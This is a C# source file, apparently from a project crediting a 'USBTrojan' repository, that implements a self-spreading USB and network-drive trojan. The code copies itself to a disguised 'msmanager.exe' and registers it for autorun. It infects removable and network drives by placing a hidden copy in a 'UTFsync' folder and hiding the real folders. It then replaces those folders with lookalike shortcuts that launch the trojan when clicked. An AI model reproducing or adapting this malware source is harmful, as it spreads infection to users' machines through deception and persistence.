using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Whistler.Classes //https://github.com/mashed-potatoes/USBTrojan
{
    static class ShellLink
    {
        [ComImport, Guid("000214F9-0000-0000-C000-000000000046"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        internal interface IShellLinkW
        {
            [PreserveSig]
            int GetPath(
                [Out, MarshalAs(UnmanagedType.LPWStr)]
                StringBuilder pszFile,
                int cch, ref IntPtr pfd, uint fFlags);

            [PreserveSig]
            int GetIDList(out IntPtr ppidl);

            [PreserveSig]
            int SetIDList(IntPtr pidl);

            [PreserveSig]
            int GetDescription(
                [Out, MarshalAs(UnmanagedType.LPWStr)]
                StringBuilder pszName, int cch);

            [PreserveSig]
            int SetDescription(
                [MarshalAs(UnmanagedType.LPWStr)]
                string pszName);

            [PreserveSig]
            int GetWorkingDirectory(
                [Out, MarshalAs(UnmanagedType.LPWStr)]
                StringBuilder pszDir, int cch);

            [PreserveSig]
            int SetWorkingDirectory(
                [MarshalAs(UnmanagedType.LPWStr)]
                string pszDir);

            [PreserveSig]
            int GetArguments(
                [Out, MarshalAs(UnmanagedType.LPWStr)]
                StringBuilder pszArgs, int cch);

            [PreserveSig]
            int SetArguments(
                [MarshalAs(UnmanagedType.LPWStr)]
                string pszArgs);

            [PreserveSig]
            int GetHotkey(out ushort pwHotkey);

            [PreserveSig]
            int SetHotkey(ushort wHotkey);

            [PreserveSig]
            int GetShowCmd(out int piShowCmd);

            [PreserveSig]
            int SetShowCmd(int iShowCmd);

            [PreserveSig]
            int GetIconLocation(
                [Out, MarshalAs(UnmanagedType.LPWStr)]
                StringBuilder pszIconPath, int cch, out int piIcon);

            [PreserveSig]
            int SetIconLocation(
                [MarshalAs(UnmanagedType.LPWStr)]
                string pszIconPath, int iIcon);

            [PreserveSig]
            int SetRelativePath(
                [MarshalAs(UnmanagedType.LPWStr)]
                string pszPathRel, uint dwReserved);

            [PreserveSig]
            int Resolve(IntPtr hwnd, uint fFlags);

            [PreserveSig]
            int SetPath(
                [MarshalAs(UnmanagedType.LPWStr)]
                string pszFile);
        }

        [ComImport,
        Guid("00021401-0000-0000-C000-000000000046"),
        ClassInterface(ClassInterfaceType.None)]
        private class Shl_link { }

        internal static IShellLinkW CreateShellLink()
        {
            return (IShellLinkW)(new Shl_link());
        }
    }
    class classUSB
    {
        public static string homeDirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\CommonData";
        public static void USBMode(string path)
        {
            classTools.Start("explorer", "/n, " + path);
            string trojanFile = homeDirectory + "\\msmanager.exe";
            if (!File.Exists(trojanFile))
            {
                try
                {
                    Directory.CreateDirectory(homeDirectory);
                    File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, trojanFile);
                    classTools.AddToAutorun(trojanFile);
                    classTools.Start(trojanFile);
                }
                catch (Exception ex)
                {
                    //Console.WriteLine(ex.Message);
                }
            }
            else
            {
                Environment.Exit(0);
            }
        }
        public static void BaseMode()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (var drive in drives)
            {
                if (classUSB.blacklist.Contains(drive.Name))
                {
                    continue;
                }
                //Console.WriteLine($"{drive.Name}: supported={classUSB.IsSupported(drive)}; infected={classUSB.IsInfected(drive.Name)}");
                if (classUSB.IsSupported(drive))
                {
                    if (!classUSB.IsInfected(drive.Name))
                    {
                        //Console.WriteLine("new uninfected drive: {0}", drive);
                        if (classUSB.CreateHomeDirectory(drive.Name) && classUSB.Infect(drive.Name))
                        {
                            //Console.WriteLine("{0} successful infected", drive);
                            classUSB.blacklist.Add(drive.Name);
                        }
                    }
                    else
                    {
                        classUSB.blacklist.Add(drive.Name);
                    }
                }
                else
                {
                    classUSB.blacklist.Add(drive.Name);
                }
            }
        }

        public static void Create(string filePath, string linkPath, string args, string descr, bool dir)
        {
            ShellLink.IShellLinkW shlLink = ShellLink.CreateShellLink();

            Marshal.ThrowExceptionForHR(shlLink.SetDescription(descr));
            Marshal.ThrowExceptionForHR(shlLink.SetPath(filePath));
            Marshal.ThrowExceptionForHR(shlLink.SetArguments(args));
            Marshal.ThrowExceptionForHR(shlLink.SetIconLocation("%SystemRoot%\\System32\\SHELL32.dll", dir ? 4 : 0));

            ((System.Runtime.InteropServices.ComTypes.IPersistFile)shlLink).Save(linkPath, false);
        }
        const string home = "UTFsync";
            const string inf_data = "\\inf_data";
            const string file_name = "\\main.exe";
            public static List<string> blacklist = new List<string>();
            public static string hwid = string.Empty;

            public static string[] GetDrives()
            {
                return Environment.GetLogicalDrives();
            }
            public static bool IsInfected(string drive)
            {
                try
                {
                    return File.Exists(drive + home + inf_data);
                }
                catch (Exception ex)
                {
                    //Console.WriteLine(ex.Message);
                    return false;
                }
            }
            public static bool CreateHomeDirectory(string drive)
            {
                try
                {
                    DirectoryInfo directoryInfo = Directory.CreateDirectory(drive + home);
                    directoryInfo.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                    return true;
                }
                catch (Exception ex)
                {
                    //Console.WriteLine(ex.Message);
                }
                return false;
            }
            public static bool Infect(string drive)
            {
                if (blacklist.Contains(drive)) return true;
                try
                {
                    string f = drive + home + file_name, key = drive + "\\ut_sf.blacklist";
                    if (File.Exists(key))
                    {
                        if (File.ReadAllText(key) == hwid)
                        {
                            //Console.WriteLine("Key verified");
                            blacklist.Add(drive);
                            return false;
                        }
                    }
                    if (File.Exists(f)) File.Delete(f);
                    File.Copy(Assembly.GetExecutingAssembly().Location, f);
                    DirectoryInfo dir = new DirectoryInfo(drive);
                    foreach (var directory in dir.GetDirectories())
                    {
                        if (CheckBlacklist(directory.Name)) continue;
                        directory.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                        Create(f, drive + directory.Name + ".lnk", "-i " + directory.Name, "Folder", true);
                    }
                    File.Create(drive + home + inf_data);
                    return true;
                }
                catch (Exception ex)
                {
                    //Console.WriteLine(ex.Message);
                }
                return false;
            }
            public static bool IsSupported(DriveInfo drive) => drive.AvailableFreeSpace > 1024 && drive.IsReady
                && (drive.DriveType == DriveType.Removable || drive.DriveType == DriveType.Network)
                && (drive.DriveFormat == "FAT32" || drive.DriveFormat == "NTFS");
            static bool CheckBlacklist(string name) => new string[] { "UTFsync", "System Volume Information", "$RECYCLE.BIN" }.Contains(name);
        
    }
}
